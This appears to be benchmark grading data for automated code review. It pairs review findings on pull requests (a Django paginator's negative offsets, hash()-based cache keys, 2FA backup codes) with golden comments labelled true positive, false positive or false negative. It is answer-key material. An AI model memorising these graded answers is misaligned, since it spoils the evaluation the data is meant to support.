In `OptimizedCursorPaginator.get_result`, the `enable_advanced_features` branch sets `start_offset = cursor.offset` (e.g. `-100`) and slices `queryset[-100:stop]`. With Django/Postgres this translates to `OFFSET -100 LIMIT ...`, which returns rows from the END of the result set, not the rows preceding the cursor. The surrounding comments ('efficient bidirectional pagination', 'reverse pagination from arbitrary positions', 'underlying Django ORM properly handles negative slicing') describe semantics that this code does not provide - it only shifts the window to the tail of the dataset. An admin who sends `cursor=<value>:-large:0` expecting 'the page before' will silently receive the last page. Either the comments should be rewritten to describe 'return a window from the tail' or the feature should be removed/renamed so callers are not misled.

New admin-gated pagination path has no test coverage

The PR adds a new branch in `OrganizationAuditLogsEndpoint.get` (and a brand-new paginator class `OptimizedCursorPaginator` with custom negative-offset handling) but ships zero test changes. There are no tests covering: the admin gating (`is_superuser` / `has_global_access`), `optimized_pagination=true` being honored, `optimized_pagination=true` being ignored for non-admins, the new `OptimizedCursorPaginator` cursor round-trip, or the negative-offset slice path. Given the feature is gated only on admin status and uses an undocumented parameter, this should not merge without at least basic endpoint and paginator unit tests.

Silent behavior change in shared `BasePaginator` for non-prev cursors

`BasePaginator.get_result` previously evaluated `results = list(queryset[offset:stop])` for all callers; the new code sets `start_offset = max(0, offset) if not cursor.is_prev else offset`. For non-prev cursors, a negative offset that previously produced a tail-of-result window now silently clamps to 0 and returns the head. `BasePaginator` powers `DateTimePaginator`, `Paginator`, and many other endpoints beyond `OrganizationAuditLogsEndpoint`; this is an API/behavior change to a shared base class that is not justified by the PR description and could break any client (or test) that relied on negative-offset tail access. The change should either be confined to the new `OptimizedCursorPaginator` or called out explicitly in the PR description.

Typo `order_b` silently breaks ASC flip for pre-ordered querysets

In `BasePaginator.build_queryset`, the branch that flips a pre-existing `-(key)` ordering to `(key)` assigns to `queryset.query.order_b` instead of `queryset.query.order_by`. The typo means the in-memory queryset is never re-ordered when the key is already present in `queryset.query.order_by` (e.g. an upstream caller applied `order_by('-datetime')` before handing the queryset to the paginator). The DESC->ASC flip then silently no-ops while the surrounding code assumes ASC semantics, so backward-paginated queries can return rows that are not actually positioned before it. This file is touched by the PR, so a careful reviewer would want this fixed (or at least acknowledged) before merge.

`OptimizedCursorPaginator.get_result` is a near-verbatim copy of `BasePaginator.get_result`

`OptimizedCursorPaginator` duplicates `BasePaginator.get_result` almost line-for-line and only differs in the negative-offset branch. The `else` branch of `OptimizedCursorPaginator.get_result` is the same as the modified `BasePaginator.get_result`. This duplication will rot: future fixes to `BasePaginator` (like the `order_b`/`order_by` typo on line 105) will not flow through, and the two implementations will diverge. The new paginator should subclass and override only the slice computation, or be merged into `BasePaginator` behind a feature flag rather than copy-pasting ~90 lines.

`optimized_pagination` query parameter is undocumented and behavior is opaque

The endpoint introduces `?optimized_pagination=true`, gated by `is_superuser or has_global_access`, that swaps in `OptimizedCursorPaginator` with `enable_advanced_features=True`. There is no docstring, API docs entry, or schema update explaining what 'optimized pagination' does, what cursor shape to use, what negative offsets mean, or that it effectively changes how the cursor's `offset` component is interpreted (tail-of-result semantics). Admin-only internal callers will be guessing. Either add API documentation describing the cursor contract, or remove the parameter from production code until the contract is nailed down.

true_positives.golden_comment: OptimizedCursorPaginator's negative-offset branch in get_result() passes cursor.offset directly as start_offset to queryset slicing when enable_advanced_features is True and cursor.offset < 0.
true_positives.matched_candidate:
`OptimizedCursorPaginator` allows negative offsets that Django ORM does not support

When `enable_advanced_features=True` and `cursor.offset < 0`, the paginator computes `start_offset = cursor.offset` and slices the queryset as `queryset[start_offset:stop]`. Django's QuerySet slicing with negative indices is not supported and raises `AssertionError: Negative indexing is not supported` (or, in some versions, produces invalid SQL `LIMIT -N`). The accompanying comment claims "The underlying Django ORM properly handles negative slicing automatically" - this is false. The new audit-log endpoint exposes this code path to any superuser or member with `has_global_access` (see `organization_auditlogs.py`), so any crafted `?cursor=...:-1:0` request against that endpoint will return a 500.

Accessing .has_global_access on organization_context.member can raise an AttributeError when organization_context is None, particularly for non-superuser non-member users.

false_positives.candidate:
Audit-log "advanced pagination" gated only by `has_global_access`, with misleading justification

The condition `request.user.is_superuser or organization_context.member.has_global_access` is the only gate on `OptimizedCursorPaginator` with `enable_advanced_features=True`. `has_global_access` is granted to any org member with access to all teams in the organization, not just admins who should be exposed to a brand-new, untested paginator path. The inline comment "This is safe because permissions are checked at the queryset level" is also incorrect: the queryset is `AuditLogEntry.objects.filter(organization_id=organization.id)` with no per-row ACL, so the new paginator gives this broader set of users arbitrary row-jumping behavior (and, given the Django-negative-slice bug above, 500s on crafted cursors). Tighten the gate (e.g., only when `request.user.is_superuser`) and add an actual permission test before enabling advanced pagination.

Cursor constructor comment promises a behavior change that is not made

The diff adds two comment lines to `Cursor.__init__` stating that negative offsets are now allowed for "advanced pagination scenarios", but the constructor itself is unchanged (`self.offset = int(offset)` was already there). At the same time, every other paginator (`OffsetPaginator`, `MergingOffsetPaginator`, `CombinedQuerysetPaginator`, `GenericOffsetPaginator`, `ChainPaginator`, `CallbackPaginator`) explicitly rejects negative offsets with `raise BadPaginationError("Pagination offset cannot be negative")`. So `Cursor` accepts negative offsets but most paginators refuse them; only the new `OptimizedCursorPaginator` uses them, and (per the finding above) it does so incorrectly. Either remove the misleading comment, or add the explicit validation in `Cursor.__init__` (and the new paginator) and propagate the relaxation to the other paginators consistently.

Missing `end_timestamp_precise` will raise KeyError and poison the batch

`process_batch` now reads `end_timestamp_precise=val["end_timestamp_precise"]`. If any incoming span in the batch omits this field, the indexing raises `KeyError`, which propagates out of `RunTask` and causes the whole batch to fail repeatedly until the bad message is skipped. The existing pattern in this same function is to use `val.get(...)` for optional fields (`parent_span_id`, `is_remote`). `end_timestamp_precise` should either be sourced via `val.get("end_timestamp_precise", 0.0)` (or similar) or be guaranteed by the producer/Relay contract. Otherwise a single malformed Kafka message halts the consumer.

New `OptimizedCursorPaginator` is shipped with no tests

`OptimizedCursorPaginator` is a 90+ line subclass of `BasePaginator` with new behavior (negative-offset slicing, `enable_advanced_features` constructor flag, duplicate `get_item_key`/`value_from_cursor` implementations copied from `Paginator`) but no test coverage is added in this PR. The `tests/` diff only touches the spans-buffer test files. Given the endpoint in `organization_auditlogs.py` already wires this paginator into production, this needs at minimum: (1) a test that exercises `enable_advanced_features=False` parity with `BasePaginator`, (2) a test of the `enable_advanced_features=True` negative-offset path (which will currently surface the Django negative-slice bug), and (3) tests covering `get_item_key`/`value_from_cursor`/cursor-string round-trip.

Redirect-chain depth reduced from 10000 to 1000 without rationale

The Lua script's redirect-following loop is reduced from `for i = 0, 10000 do` to `for i = 0, 1000 do`, and the original comment that acknowledged the limit ("theoretically this limit means that segment trees of depth 10k may not be joined together correctly") is silently deleted. With depth capped at 1000, any trace whose `span-buf:sr:` redirect chain is longer than 1000 will exit the loop before convergence, write the new span to a stale `set_span_id`, and then fail to merge subsequent spans into the real segment set. The downstream consequence is silently dropped spans (incomplete segments flushed out) - a data integrity regression. Either keep the previous limit (or document the new, lower bound), or actually change the algorithm so a depth-bounded walk is correct (e.g., iterate by current `set_span_id`, not by a fixed counter).

true_positives.golden_comment: Using Python’s built-in hash() to build cache keys is non-deterministic across processes (hash randomization), so keys won’t match across workers and invalidate_upsampling_cache may fail to delete them. Use a deterministic serialization of project_ids for the cache key.
true_positives.matched_candidate:
Cache key uses hash() which is randomized per Python process

The cache key uses `hash(tuple(sorted(snuba_params.project_ids)))`. Python's built-in `hash()` for tuples is randomized per interpreter process (PYTHONHASHSEED). In any multi-process deployment (uWSGI/gunicorn workers), each worker will compute a different hash for the same project set, so cache entries written by one worker will never be read by another. Consequences: (1) the cache provides no benefit across workers — every request is a miss; (2) `invalidate_upsampling_cache` (line 67) computes the same randomized hash in its caller, so it cannot invalidate entries created by other workers, making the invalidation function dead in practice. Use a deterministic hash (e.g., `hashlib.sha256` over the joined IDs) or simply stringify the sorted IDs.

false_negatives.golden_comment: In _set_sample_rate_from_error_sampling(), the check `if client_sample_rate:` treats 0.0 as falsy, so a sample_rate of 0.0 is silently skipped and never set on normalized_data.

The upsampling eligibility check passes the outer dataset instead of the actual dataset used by scoped_dataset. In paths where the query ultimately runs against discover (e.g., dashboard split) while the original dataset is metrics, upsampling may be skipped even when all projects are allowlisted.

false_positives.candidate:
Public entry point is_errors_query_for_error_upsampled_projects has no direct test

The new test file exercises the private helpers (`_are_all_projects_error_upsampled`, `_is_error_focused_query`, `_should_apply_sample_weight_transform`, `transform_query_columns_for_error_upsampling`) but never calls `is_errors_query_for_error_upsampled_projects`, which is the only function actually used by `OrganizationEventsStatsEndpoint._get_event_stats`. The cache hit/cache miss branches and the short-circuit behavior on the cached value are uncovered. Add at least one test that mocks `sentry.utils.cache.cache` and asserts both the cached and uncached paths.

Tests share the 60s eligibility cache and produce order-dependent results

`is_errors_query_for_error_upsampled_projects` caches the allowlist result in `sentry.utils.cache.cache` for 60s keyed by `hash(tuple(sorted(project_ids)))`. All four tests in `OrganizationEventsStatsErrorUpsamplingTest` query the same set of project IDs and only swap `mock_options.get.return_value`. The first test that runs populates the cache (e.g., True for the full allowlist case); subsequent tests that expect the un-upsampled `count == 1` path will instead see the cached True and get upsampled counts of 10, failing. There is no `cache.clear()` in `setUp` and the helper is not patched. Add a cache reset in `setUp` (or key the cache on something that varies per test, e.g. include the option value), otherwise the suite is order-dependent and effectively does not exercise both branches.

_should_apply_sample_weight_transform types dataset as Any instead of ModuleType

`_should_apply_sample_weight_transform(dataset: Any, request: Request)` compares `dataset` against `discover`, `errors`, and `transactions` modules. The parameter is typed `Any`, but the caller (`organization_events_stats.py` line 220) passes a module from `sentry.snuba`, and the new module is in the stricter-typing `[[tool.mypy.overrides]]` block in `pyproject.toml`. Type it as `ModuleType` (matching the public `is_errors_query_for_error_upsampled_projects` signature) so mypy catches accidental non-module values.

client_sample_rate accepted without range validation

`_set_sample_rate_from_error_sampling` blindly casts `contexts.error_sampling.client_sample_rate` to float and stores it as `sample_rate` if truthy. Nothing rejects values outside [0, 1], negative numbers, or NaN. A malformed client sending `client_sample_rate: 100` (or `-1`) will poison `sample_weight` for every event in that project, which then propagates into `upsampled_count()` aggregates (`sum(sample_weight)` in `discover.py`) and silently inflates or zeroes out error counts in dashboards/alerts for allowlisted projects. Add an explicit range check (or coerce/log invalid values) before writing back into `normalized_data`.

invalidate_upsampling_cache is defined but never called

The helper `invalidate_upsampling_cache` is added but no caller exists in the diff. The function is meant to flush cache entries when the `issues.client_error_sampling.project_allowlist` option changes, but nothing in the codebase invokes it. As a result, after an admin adds/removes a project from the allowlist, stale `True`/`False` values will be served for up to 60 seconds across the whole worker pool. Either wire it up to the option change handler or remove it. Note: even if it were called, the randomized `hash()` in the key (see other finding) means it would only invalidate entries in the calling process.

true_positives.golden_comment: Hardcoded empty data passed to TableWidgetVisualization causes it to always render an empty table instead of displaying actual results when the feature flag is enabled.
true_positives.matched_candidate:
TableWidgetVisualization is rendered with empty columns and empty data when the feature flag is on

Inside `tableResultComponent`, when `organization.features.includes('use-table-widget-visualization')` is true, `<TableWidgetVisualization>` is rendered with `columns={[]}` and `tableData={{ data: [], meta: { fields: {}, units: {} } }}`, ignoring the actual `result.data` and `result.meta` (and `fieldAliases`, `fields`, `fieldHeaderMap`, etc. used by the legacy path). The gated branch should pass the real `result.data`, `result.meta`, and columns derived from `result.meta.fields` (and any `fieldAliases`/`fieldHeaderMap`/`getCustomFieldRenderer`) rather than hard-coded empty values.

true_positives.golden_comment: Analytics events are recorded before the feature flag check, resulting in analytics being logged for all requests, including those that return 404 due to the feature being disabled. This can lead to misleading analytics data.
true_positives.matched_candidate:
Analytics recorded before authorization check

`analytics.record("preprod_artifact.api.assemble", ...)` is invoked at the top of `post`, before the `features.has("organizations:preprod-artifact-assemble", ...)` gate and before any other validation (schema validation, chunk upload checks, etc.). This means every POST to this endpoint — including unauthorized, malformed, and feature-flag-disabled requests — will be counted in the analytics event, skewing usage data and breaking any downstream dashboards or alerting on this event. The analytics call should be moved to after the feature flag check and ideally after the request has been validated as legitimate.

false_negatives.golden_comment: The BrowserReportingCollectorEndpoint returns HttpResponse objects but the endpoint inherits from Endpoint which expects rest_framework.response.Response objects.
In BaseDetectorTypeValidator.update(), the validator incorrectly updates instance.type using validated_data.get('detector_type') instead of validated_data.get('type').

Using zip(error_ids, events.values()) assumes the get_multi result preserves the input order; dict value order is not guaranteed to match error_ids, so event data can be paired with the wrong ID (missing nodes also shift alignment).

Validation logic incorrectly uses .get('timestamp'), which treats a timestamp of 0 as absent. It should directly check 'timestamp' in self.initial_data to ensure proper field presence detection, preventing both 'age=0' and 'timestamp' from passing mutual-exclusion validation.

false_positives.candidate:
Default for sentry:autofix_automation_tuning changed from "low" to "off" without an opt-in rollout

`DEFAULT_AUTOFIX_AUTOMATION_TUNING_DEFAULT` changed from "low" to "off", and the project option default (`src/sentry/projectoptions/defaults.py`) was updated to match. This silently changes behavior for any project that was relying on the previous default of "low". Combined with the existing feature flag handling in `test_project_details.py`/`test_project.py` which now assert the new default, this is a behavior change shipped in the same release as the code rather than a controlled rollout. Projects that have never explicitly set this option will see autofix turned off after deploy, which is a user-visible behavior change that should either require an explicit upgrade step or be gated behind a flag.

Fallback column derivation reads meta.fields with no null check

When `columns` is not provided, the fallback computes `Object.keys(tableData?.meta.fields).map(...)`. The optional chaining handles `tableData` being undefined but does not handle `tableData.meta` itself being undefined — if a caller passes `tableData` without a `meta` key (or with `meta: undefined`), this throws `TypeError: Cannot read properties of undefined (reading 'fields')`. This becomes very real given that `chart.tsx` is calling this component with `tableData.meta` set, but downstream callers may forget. Use `tableData?.meta?.fields` for the safe default.

Mutating an already-named Django migration to a no-op without its replacement in the same PR

Same issue as 0917: the comment refers to `0921_convert_org_saved_searches_to_views_rerevised.py` which is not in this PR, and the migration body has been reduced to `return`. If any environment has applied 0920, Django will refuse to continue and may require manual intervention; if no environment has applied it, this still relies on a migration (0921) that the reviewer cannot inspect, and the corresponding test for the conversion has been removed without a replacement test for 0921.

Mutating an already-named Django migration to a no-op without its replacement in the same PR

The file references `0921_convert_org_saved_searches_to_views_rerevised.py` in its docstring/comment but that migration is not part of this PR. Replacing the body of a migration that is already named and shipped (0917 was generated 2025-04-28, 0920 on 2025-06-03) is dangerous: any environment that recorded an applied state of these migrations will see a hash mismatch when `manage.py migrate` is next run, and any fresh database will silently skip the conversion because 0921 is not present here. Either the coordinating 0921 migration needs to be in this PR, or these files should be left as-is and 0921 should supersede them through the normal Django migration chain (i.e., 0917/0920 must remain non-no-ops, and 0921 must depend on them).

PR comment template no longer includes the issue culprit/subtitle

The previous comment format was `- ‼️ **{title}** \`{subtitle}\` [View Issue]({url})`, which surfaced the issue's `culprit` (the file/function associated with the issue). The new template is `* ‼️ [**{title}**]({url}){environment}\n` and replaces the subtitle with an environment tag. Anyone scanning PR comments to find which file triggered an issue loses that information. If the subtitle was noisy or low-value, that's fine, but this is a deliberate change to user-visible PR content and should be called out in release notes.

Per-error nodestore lookup not batched

`fetch_error_details` does `nodestore.backend.get_multi(node_ids)` which is batched, but for each issue the broader flow calls `issue.get_recommended_event()` (separate Eventstore lookup) inside `fetch_error_details` would be one DB query per error. In `make_seer_request` the actual call passes the full log list at once, so the prompt is fine, but `fetch_error_details` itself iterates and calls `Event.generate_node_id` for each error id; if error_ids is large this is N independent DB reads per call site. Not a blocker but worth a follow-up to batch event lookups.

Visualize constructor signature changed from (yAxes[], options) to (yAxis, options)

`Visualize` previously accepted `yAxes: readonly string[]` and stored an array of y-axes per visualize. It now requires a single `yAxis: string`. While the in-tree callers have been updated, this is an exported public class used by getsentry and other downstream consumers. Any external code constructing `new Visualize(["count()", "avg()"], {...})` will now pass an array as the first argument and the class will store the array as a string (TypeScript will likely error or, worse, silently misbehave). Either keep both shapes via a deprecated overload, document this as a breaking change in a changelog/release notes, or guard with a runtime check that throws a clear error for the old shape.

dcg_to_slow_conditions now keyed by dcg_ids instead of dcg_to_groups.keys()

`get_condition_query_groups` previously computed `dcg_to_slow_conditions` from `event_data.dcg_to_groups.keys()` and looked up `dcg_to_slow_conditions[dcg.id]` for every dcg in `data_condition_groups` (which is fetched from `event_data.dcg_ids`). After the refactor, the slow-conditions dict is built once from `event_data.dcg_ids` and reused in both `get_condition_query_groups` and `get_groups_to_fire`. The new behavior is more correct (it now covers DCGs present in `dcg_ids` but missing from `dcg_to_groups`, which would previously have raised `KeyError`), but it changes the set of condition groups considered "slow". Any DCG that previously was not flagged as slow because it was missing from `dcg_to_groups.keys()` will now be flagged as slow, potentially altering which conditions get sent to Snuba and which workflows fire. Worth verifying with a sample trace that this matches the intended semantics.

get_environment_info swallows all exceptions via bare `except Exception`

`get_environment_info` catches `Exception` for the entire `issue.get_recommended_event()` + `recommended_event.get_environment()` block and logs the error as `info` rather than `warning`/`error`. This hides genuine failures (DB outages, programming errors, schema drift) behind a benign-looking info log and degrades the new PR comment feature silently. The try/except should at minimum scope the catch (e.g., only catch expected lookup misses / `Group.DoesNotExist`-style failures) and the unexpected branch should log at warning or re-raise so issues surface in Sentry.

max_segment_id null guard could mask the same bug elsewhere

`_make_recording_filenames` now early-returns `[]` when `row["max_segment_id"] is None`, and the TypedDict was widened from `int` to `int | None`. The accompanying test (`tests/sentry/replays/tasks/test_delete_replays_bulk.py`) was updated to match. This is a defensive fix, but a `max_segment_id` of None on a real replay row is data the bulk-delete query should be filtering out upstream (via `WHERE max(segment_id) IS NOT NULL`) rather than producing rows that silently delete nothing. Verify that the Snuba query in `fetch_rows_matching_pattern` excludes or filters these rows so the caller doesn't keep paging through hundreds of empty results.

schedule_webhook_delivery given a 30s processing_deadline_duration

`schedule_webhook_delivery` is the parent task that fans out delivery tasks to `drain_mailbox`. 30s is a tight budget for a task that may need to schedule a large batch of webhook deliveries (Redis push, multiple apply_async calls, potentially across many integrations). If the task exceeds 30s the in-flight work is killed by the taskworker, leaving deliveries unscheduled. Consider a more generous budget (e.g., 5–10 minutes consistent with `drain_mailbox`) or chunk the dispatch into smaller batches.

true_positives.golden_comment: Because backupCodes are decrypted and mutated in memory before being written back, two concurrent login requests using the same backupCode could both pass this check and update, so a single backup code may effectively be accepted more than once if used concurrently, weakening the intended one-time-use semantics.
true_positives.matched_candidate:
Backup code consumption is not atomic; same code can authorize two sessions

After matching the code, the entry is nullified in the in-memory array and the encrypted blob is written back via a single prisma.user.update. There is no transaction or optimistic check. Two concurrent authorize() calls presenting the same backup code can both read the original array, both nullify index N, and both persist - the second call sees an apparently-valid code and authenticates. The window is small in practice (single user/device), but it directly violates the 'one-time use' guarantee that backup codes are sold on, and is worth a note.

true_positives.golden_comment: Object URL for backup codes is not revoked on component unmount, leading to a potential memory leak. This can cause increased memory usage over time, especially if the component is mounted and unmounted frequently.
true_positives.matched_candidate:
Backup-codes blob URL is never revoked on close or unmount

Line 99 calls URL.createObjectURL(textBlob) and stores the result in state. The only revocation is on line 98 inside handleSetup, which only runs when setup is re-invoked successfully. resetState (lines 71-75) does not revoke the URL and the Dialog's onOpenChange handler does not either, and there is no useEffect cleanup. Every successful 2FA setup that is followed by clicking Close, Cancel, X, or an outside click leaks the blob URL for the lifetime of the page. Combined with resetState not clearing backupCodesUrl (see next finding), the URL also leaks across modal open/close cycles.

false_negatives.golden_comment: The exported function TwoFactor handles backup codes and is in BackupCode.tsx. Inconsistent naming.
Error message mentions 'backup code login' but this is a disable endpoint, not login

Backup code validation is case-sensitive due to the use of indexOf(). This causes validation to fail if a user enters uppercase hex characters, as backup codes should be case-insensitive for a better user experience.

false_positives.candidate:
Backup code login and disable flows have no e2e tests

The PR introduces backup code generation, login via backup code, and disabling 2FA via backup code across next-auth-options.ts, disable.ts, login.tsx, and DisableTwoFactorModal.tsx. The only backup-code-related test added is clicking the download/copy/close buttons in the post-enable dialog (lines 110-125). There is no e2e test that (1) logs in using a backup code, (2) verifies one-time use so a consumed code cannot log in again, (3) disables 2FA through the new 'Lost access' backup code branch, (4) verifies the IncorrectBackupCode / MissingBackupCodes error paths, or (5) inspects the downloaded file. The TODO at line 12 acknowledges the gap, but for a security-sensitive recovery flow the absence of coverage means regressions (e.g., accidental reuse of a code, broken decryption path, race between TOTP and backup branches) can ship undetected.

Clipboard write rejection is silently ignored

navigator.clipboard.writeText(backupCodes.map(formatBackupCode).join("\n")) returns a promise that can reject (insecure context, denied permission, document not focused). The handler ignores the promise and unconditionally shows the success toast `backup_codes_copied`. Users on browsers/contexts without clipboard API permission see a misleading success message while nothing was copied.

Making PasswordField required can break 2FA disable for non-CAL users

PasswordField now declares required when it is shown. The disable endpoint at apps/web/pages/api/auth/two-factor/totp/disable.ts intentionally skips password verification for non-CAL identity providers (the guard `user.identityProvider === IdentityProvider.CAL` on line 40). If any caller of DisableTwoFactorModal renders it with disablePassword={false} (the default) for a SAML/Google user, that user will be asked for a password they do not have and will be unable to submit the form even though the API would have accepted the disable. The PR does not audit or update call sites of this modal, so this is a likely regression for non-CAL users trying to disable 2FA (including via the new 'Lost access' backup-code branch).

missing_backup_codes message is misleading and leaks account state

When the server returns MissingBackupCodes, the login UI shows t("missing_backup_codes") = "No backup codes found. Please generate them in your settings." In the login flow the user has not yet authenticated, so directing them to settings is not actionable, and the message distinguishes users who have backup codes from those who do not - a small information leak about account state that is otherwise collapsed into a generic error.

resetState leaves backupCodes, backupCodesUrl, dataUri and secret populated

resetState only clears password, errorMessage and step. backupCodes (the in-memory list of plain codes), backupCodesUrl (the blob URL), dataUri (QR image) and secret (TOTP secret) remain. After Cancel/Close the next render of the dialog can therefore briefly render data that no longer matches the database, and the QR image / secret remain in the DOM and in memory until the component is remounted. The blob URL is not revoked (see companion finding), so it persists as a live object URL even after reset.

true_positives.matched_candidate:
updateEvent fallback finds by externalId === externalCalendarId (its own falsy arg)

In `updateEvent`: `const selectedCalendar = externalCalendarId ? externalCalendarId : event.destinationCalendar?.find((cal) => cal.externalId === externalCalendarId)?.externalId;`. The branch only runs when `externalCalendarId` is falsy, but then `.find` compares each calendar’s `externalId` against that same falsy value — it can essentially never match, so `selectedCalendar` will always be `undefined` in the fallback path and the update will fall back to whatever `calendarId` ends up being (`undefined` here, since the destructuring doesn’t define one). This is a regression vs. the old line `event.destinationCalendar?.externalId`, which at least returned the first calendar’s externalId. The intended fallback was almost certainly `event.destinationCalendar?.[0]?.externalId` (or matching by `credentialId`).
